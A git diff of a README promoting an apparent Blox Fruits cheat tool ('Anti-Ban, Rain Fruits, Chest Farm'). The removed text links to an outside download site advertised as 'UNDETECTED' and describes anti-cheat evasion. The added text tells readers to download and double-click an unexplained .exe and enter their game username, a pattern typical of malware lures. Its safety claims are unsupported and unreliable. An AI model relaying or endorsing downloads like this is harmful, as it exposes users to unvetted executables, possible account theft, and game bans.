@@ -1,33 +1,88 @@
-# Blox Fruits: Anti-Ban, Rain Fruits, Chest Farm
-By utilizing the Chest Farm technique, you can guarantee that you won't overlook any valuable chests, allowing you to maximize your rewards and reap the benefits to the fullest.
-## 🔴 **INSTANT DOWNLOAD** 🔴
+# 🎮 Best-Blox-Fruits-Auto-Farming-2025 - Automate Your Blox Fruits Adventure
 
-<a href="https://cleavix.pro/">
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=180&section=header&text=DOWNLOAD%20NOW&fontSize=42&fontColor=ffffff&animation=twinkling&fontAlignY=32&desc=UNDETECTED%20•%20WORKING%20•%20FREE&descAlignY=60&descAlign=50" width="100%">
-</a>
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/i-muhammadahmad/Best-Blox-Fruits-Auto-Farming-2025/releases)
 
-[![Version](https://img.shields.io/badge/Version-3.2.1-blue?style=for-the-badge)](https://cleavix.pro/)
-[![Users](https://img.shields.io/badge/Active%20Users-50,000+-orange?style=for-the-badge)](https://cleavix.pro/)
+## 🚀 Getting Started
 
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHZv-pHPusWox14ElT0uL9yjyc5gvXLREyxA&s" width="100%">
-    
-</div>
+Welcome to **Best-Blox-Fruits-Auto-Farming-2025**! This tool helps you automate tasks in Blox Fruits. You can enjoy features like anti-ban measures, rain fruits, and chest farming. Follow the steps below to download and start using the application.
 
-***Blox Fruits: Anti-Ban, Rain Fruits, Chest Farm*** - [Download](https://cleavix.pro/)
+## 📥 Download & Install
 
----------------------------------------------------------------------------------------------------------------------------------------
-![0](https://github.com/Blox-Fruits-Anti-Ban/Blox-Fruits-Anti-Ban/assets/156610710/93b925ca-a577-4b45-aa69-73d4cd6f4468)
+To begin, you need to visit the Releases page to download the latest version of the software. You can do this by clicking the button below:
 
+[Download Latest Release](https://github.com/i-muhammadahmad/Best-Blox-Fruits-Auto-Farming-2025/releases)
 
-# Anti-Ban 
-scripts typically include various measures to evade detection by game moderators or anti-cheat systems. These measures may include hiding or disguising cheat features, implementing randomized or delayed actions, or using algorithms to mimic human-like behavior. Its added a layer of protection against detection and potential penalties for using cheats.
+### Step 1: Visit the Releases Page
 
+1. Click on the link above to go to the Releases page on GitHub.
+2. You will see a list of available versions.
 
-# Rain Fruits
-These fruits are known for their ability to manipulate or control the element of rain. Each Rain Fruit grants the player unique abilities related to rain, such as summoning rainstorms, creating water-based attacks, or enhancing their agility and speed in wet environments. 
+### Step 2: Select the Version
 
+1. Look for the latest release (it usually appears at the top).
+2. Click on that version to view its details.
 
-# Chest Farm
-Chests are valuable items that can contain various rewards such as in-game currency or other rare items. Chest farming involves repeatedly searching for and collecting chests in specific locations or through specific methods to maximize the rewards obtained.
+### Step 3: Download the Installation File
 
-Players may use various techniques to optimize their chest farming, such as memorizing the spawn locations of chests, using efficient movement or traversal abilities, or coordinating with other players to cover more ground and find chests faster. Chest farming can be a popular activity as it allows players to acquire valuable resources and items that can enhance their progression and gameplay experience in Blox Fruits.
+1. Scroll down to the "Assets" section of the release.
+2. Find the file named `Best-Blox-Fruits-Auto-Farming-2025.exe`.
+3. Click on it to start the download.
+
+### Step 4: Run the Application
+
+1. Navigate to the folder where you downloaded the `.exe` file.
+2. Double-click on `Best-Blox-Fruits-Auto-Farming-2025.exe` to run the application.
+
+## 🛠️ System Requirements
+
+- **Operating System:** Windows 10 or later
+- **CPU:** 2.0 GHz dual-core processor or higher
+- **RAM:** 4 GB minimum
+- **Storage:** At least 200 MB of free space
+- **Internet:** Required for authentication and updates
+
+## ⚙️ Features
+
+- **Anti-Ban Protection:** Automatically ensures your account remains safe while farming.
+- **Rain Fruits:** Collect fruits efficiently without manual effort.
+- **Chest Farm:** Automatically farm chests to gather valuable items.
+
+## 🛡️ Authentication
+
+Before using the application, you need to authenticate your account. This step ensures secure access to the game features.
+
+1. Launch the application.
+2. Enter your Blox Fruits account username.
+3. Follow any prompts for verification.
+
+## 🌐 Support
+
+If you have questions or encounter issues, please check the following resources:
+
+- **FAQ Section**: Frequently asked questions can be found within the application.
+- **Issues Page**: Report problems directly on the [Issues page of our GitHub repository](https://github.com/i-muhammadahmad/Best-Blox-Fruits-Auto-Farming-2025/issues).
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/i-muhammadahmad/Best-Blox-Fruits-Auto-Farming-2025)
+- [Documentation](https://github.com/i-muhammadahmad/Best-Blox-Fruits-Auto-Farming-2025/wiki)
+
+## 🛠️ Additional Resources
+
+For those interested in understanding the technology behind this application, here are some relevant topics:
+
+- **JavaScript**: The application utilizes JavaScript for scripting tasks.
+- **Data Scraping**: Efficiently gathers game data as needed.
+- **Multilingual Support**: The application supports multiple languages for a better user experience.
+
+## ✅ Updating the Application
+
+To ensure you have the latest features and security updates, regularly check the Releases page. Follow the download steps to install any new versions.
+
+Remember to delete the old version before installing the latest one to avoid any potential conflicts.
+
+## 👥 Community Engagement
+
+We welcome suggestions and contributions! You can engage with others in the community by leaving comments on the GitHub repository or participating in discussions related to Blox Fruits automation.
+
+Thank you for using **Best-Blox-Fruits-Auto-Farming-2025**. We hope you enjoy the enhanced gameplay experience!
